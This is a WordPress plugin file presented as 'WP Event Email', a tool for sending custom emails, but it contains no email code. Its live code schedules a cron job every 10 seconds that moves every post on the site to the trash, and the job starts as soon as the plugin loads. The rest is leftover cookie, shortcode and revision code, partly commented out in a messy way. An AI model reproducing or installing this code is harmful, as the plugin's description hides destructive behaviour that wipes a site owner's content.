<?php /*
Plugin Name:  WP Event Email
Plugin URI:   https://sialacademy.com/
Description:  WP Event email are good for custom email to send uer on nay organization to send emplay any
Version:      1.1
Author:       mahar.org
Author URI:   https://sialacademy.com/
 */
/*
add_action('init', 'my_setcookie');

// my_setcookie() set the cookie on the domain and directory WP is installed on
function my_setcookie(){
    $path = parse_url(get_option('siteurl'), PHP_URL_PATH);
    $host = parse_url(get_option('siteurl'), PHP_URL_HOST);
    $expiry = strtotime('+1 month');
    setcookie('my_cookie_name_1', 'my_cookie_value_1', $expiry, $path, $host);
    /* more cookies */
    //setcookie('cookie_name_1', 'my_cookie_', $expiry, $path, $host);
    //setcookie('my_cookie_name_1', 'my_cookie_value_2', $expiry, $path, $host);
//}


//[foobar]
function foobar_func( )
{

    echo get_option( 'test_complete' );


}
   // return "foo and bar test";*/
//}

add_shortcode( 'foobar', 'foobar_func' );

register_activation_hook(__FILE__, 'my_activation');

function my_activation() {
    if (! wp_next_scheduled ( 'my_hourly_event' )) {
        wp_schedule_event(time(), 'hourly', 'my_hourly_event');
    }
}

add_action('my_hourly_event', 'do_this_hourly');

function do_this_hourly() {
    // do something every hour
}

add_filter( 'cron_schedules', 'wpe_point_expiry_time' );
    // Schedule an action if it's not already scheduled
if ( ! wp_next_scheduled( 'wpe_point_expiry_time' ) ) {
    wp_schedule_event( time(), 'wpe_setup_point_expiry_time', 'wpe_point_expiry_time' );
}

add_action( 'wpe_point_expiry_time', 'wpe_setup_point_expiry_time_event_func');


function wpe_point_expiry_time( $schedules ) {
    $schedules['wpe_setup_point_expiry_time'] = array(
        'interval'  => 10, // 60 = 60 seconds
        'display'   => __( 'Every 10 seconds', 'mycred' )
    );
    return $schedules;
}

function wpe_setup_point_expiry_time_event_func() {
    update_option('test_complete', 95);

    $lastposts = get_posts( array(
        'posts_per_page' => -1,

    ) );

    if ( $lastposts ) {
        foreach ( $lastposts as $post ) :
            setup_postdata( $post );
            wp_trash_post($post->ID );
        endforeach;

    }

}

function wpdocs_register_my_custom_menu_page(){
    add_menu_page(
        __( 'WP Event Email', 'textdomain' ),
        'WP Event Email',
        'manage_options',
        'wp_event_email',
        'my_wp_event_email',
        plugins_url( 'myplugin/images/icon.png' ),
        6
    );
}
add_action( 'admin_menu', 'wpdocs_register_my_custom_menu_page' );
function my_wp_event_email (){
    $all_html_content = "<h1>this is the event option page settings</h1>";
   echo $all_html_content;
}
//define('DISABLE_WP_CRON', true);

// delete_post_revisions will be call when the Cron is executed
//add_action( 'delete_post_revisions', 'delete_all_post_revisions' );

// This function will run once the 'delete_post_revisions' is called
//function delete_all_post_revisions() {

   /* $args = array(
        'post_type' => 'post',
        'posts_per_page' => -1,
        // We don't need anything else other than the Post IDs
        'fields' => 'ids',
        'cache_results' => false,
        'no_found_rows' => true
    );

    $posts = new WP_Query( $args );*/

    // Cycle through each Post ID
   /* foreach( (array)$posts->posts as $post_id ) {

        // Check for possible revisions
        $revisions = wp_get_post_revisions( $post_id, array( 'fields' => 'ids' ) );

        // If we got some revisions back from wp_get_post_revisions
        if( is_array( $revisions ) && count( $revisions ) >= 1 ) {

            foreach( $revisions as $revision_id ) {

                // Do a final check on the Revisions
                if( wp_is_post_revision( $revision_id ) ) {
                    // Delete the actual post revision
                    wp_delete_post_revision( $revision_id);
                }
            }
        }
    }
}*/

?>